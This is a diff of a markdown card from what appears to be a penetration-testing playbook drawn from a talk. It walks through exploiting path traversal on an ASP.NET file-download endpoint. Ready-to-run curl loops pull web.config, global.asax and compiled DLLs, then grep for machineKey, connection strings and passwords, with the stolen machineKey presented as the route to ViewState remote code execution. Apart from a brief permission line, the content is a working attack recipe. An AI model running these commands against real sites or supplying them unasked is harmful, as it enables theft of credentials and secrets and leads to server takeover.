@@ -1,92 +1,92 @@
 # Batch 03 — Read files → web.config → DLLs
 
+## FILL IN
+
+```bash
+# example from the talk — change to YOUR download URL + param name
+BASE="https://TARGET/v1/DownloadCategoryExcel"
+PARAM="fileName"
+```
+
 ## GOAL
-If a parameter is a file name, climb out with `../` and grab config + app DLLs.
+If a parameter is a file name, use `../` to read **web.config**, then **bin/*.dll**.
 
 ## TIME
 ~1 hour
 
 ## YOU NEED
-- URL with file param (`fileName`, `file`, `path`, …)
-- File-read allowed in scope
+- A download/export URL that takes a file name (from proxy history)
+- Permission to test file read
 
 ---
 
-## WHY (30 seconds)
+## WHY (kid version)
 
-Bad C# often does:
+Bad code does: `open(folder + user_input)`.  
+You set user_input to `../../web.config` → climb out of the folder.
 
-```text
-open( folder + user_input )
-```
-
-If user_input is `../../web.config`, you leave the folder and read the app’s **settings file**.  
-`web.config` can hold:
+**web.config** often has:
 
 - database passwords  
-- **machineKey** (needed for VIEWSTATE RCE next card)  
-- names of DLLs in `bin/`
+- **machineKey** (needed for RCE in batch 04)  
+- DLL names under `bin/`
 
-DLLs = compiled app code you can reverse later.
+Talk order: `web.config` → `global.asax` → `bin/Company.Web.Api.dll`
 
 ---
 
 ## DO THIS
-
-```bash
-# CHANGE to real endpoint
-BASE="https://TARGET/v1/DownloadCategoryExcel"
-```
 
 ### 1) Prove `../` works
 
 ```bash
 for p in '../../web.config' '..%2f..%2fweb.config' '..\..\web.config'; do
   echo "=== $p ==="
-  curl -sk -G "$BASE" --data-urlencode "fileName=$p" -D- -o /tmp/out | head -12
-  file /tmp/out; head -c 180 /tmp/out; echo
+  curl -sk -G "$BASE" --data-urlencode "$PARAM=$p" -D- -o /tmp/out | head -15
+  file /tmp/out
+  head -c 200 /tmp/out; echo
 done
 ```
 
-### 2) Save gold files
+**Win:** file looks like XML config (`<configuration>`), not an error page.
+
+### 2) Save gold files (exact talk paths)
 
 ```bash
-curl -sk -G "$BASE" --data-urlencode "fileName=../../web.config" -o web.config
-curl -sk -G "$BASE" --data-urlencode "fileName=../../global.asax" -o global.asax
-grep -iE 'machineKey|connectionString|password' web.config
+curl -sk -G "$BASE" --data-urlencode "$PARAM=../../web.config" -o web.config
+curl -sk -G "$BASE" --data-urlencode "$PARAM=../../global.asax" -o global.asax
+grep -iE 'machineKey|connectionString|password|namespace' web.config
 ```
 
-### 3) Pull DLLs named in config
+### 3) Pull DLL named in config
+
+If you see something like `Company.Web.Api`:
 
 ```bash
-# change Company.Web.Api.dll to a name you saw
-curl -sk -G "$BASE" --data-urlencode "fileName=../../bin/Company.Web.Api.dll" \
+curl -sk -G "$BASE" --data-urlencode "$PARAM=../../bin/Company.Web.Api.dll" \
   -o Company.Web.Api.dll
 file Company.Web.Api.dll
+# should say PE32 / DLL — not HTML
 ```
 
-### 4) If you have **write/upload** instead of read (slide note)
+Repeat for other assembly names.
 
-Sometimes you cannot download `web.config`, but you can **upload** a file named like config or drop under a writable folder.  
-That is a different bug (upload → config/handler). Still: after any write under web root, re-check `web.config` / handlers / `.aspx` shells per program rules.
-
-### 5) Write down
+### 4) Write 3 lines
 
 ```text
 LFI: yes/no
 machineKey: yes/no
-DLLs saved:
-upload/write:
+DLL files:
 ```
 
 ---
 
 ## IF / THEN
 
-| What you saw | What you do |
-|--------------|-------------|
-| machineKey lines | → **04** |
-| DLLs only | → **05** |
+| You see | You do |
+|---------|--------|
+| machineKey in web.config | → **04** now |
+| DLL files only | → **05** |
 | No LFI | → **06** if XML, **07** shortnames, **05** if vendor paths |
 
 ---
@@ -94,4 +94,4 @@ upload/write:
 ## NEXT
 → [04-viewstate-rce.md](./04-viewstate-rce.md) or [05-dnspy-dependencies.md](./05-dnspy-dependencies.md)
 
-**Slide map:** deck slides 13–15 (LFI → web.config → bin DLL).
+**Slides:** 13–15
